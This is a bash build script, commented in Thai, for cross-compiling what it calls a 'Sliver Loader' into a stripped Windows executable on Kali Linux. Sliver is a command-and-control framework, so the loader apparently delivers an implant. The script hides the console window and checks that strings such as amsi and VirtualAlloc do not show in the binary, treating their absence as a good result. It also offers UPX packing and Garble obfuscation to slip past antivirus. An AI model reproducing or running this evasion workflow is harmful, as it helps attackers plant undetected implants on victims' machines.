#!/bin/bash
# build.sh — Cross-compile Sliver Loader บน Kali Linux
#
# ต้องการ:
#   sudo apt install golang-go (v1.21+)
#   go get golang.org/x/sys
#
# ผลลัพธ์:
#   loader.exe — stripped, no debug symbols, Windows x64

set -e

echo "[*] Setting up Go dependencies..."
go mod tidy

echo "[*] Cross-compiling for Windows x64..."
GOOS=windows \
GOARCH=amd64 \
CGO_ENABLED=0 \
go build \
  -o loader.exe \
  -ldflags="-s -w -H=windowsgui" \
  -trimpath \
  .

echo "[+] Build complete: loader.exe"
echo ""
echo "[*] File info:"
file loader.exe
ls -lh loader.exe

echo ""
echo "[*] Checking for suspicious strings (should be minimal):"
echo "    --- Checking for DLL names ---"
strings loader.exe | grep -iE "kernel32|ntdll|amsi|VirtualAlloc|CreateThread" | head -20 || echo "    (none found — good!)"

echo ""
echo "[*] Optional: UPX pack (adds entropy, may trigger some AV):"
echo "    upx --best loader.exe"
echo ""
echo "[*] Optional: Garble (obfuscate Go symbols):"
echo "    go install mvdan.cc/garble@latest"
echo "    GOOS=windows GOARCH=amd64 garble -literals -tiny build -o loader.exe ."
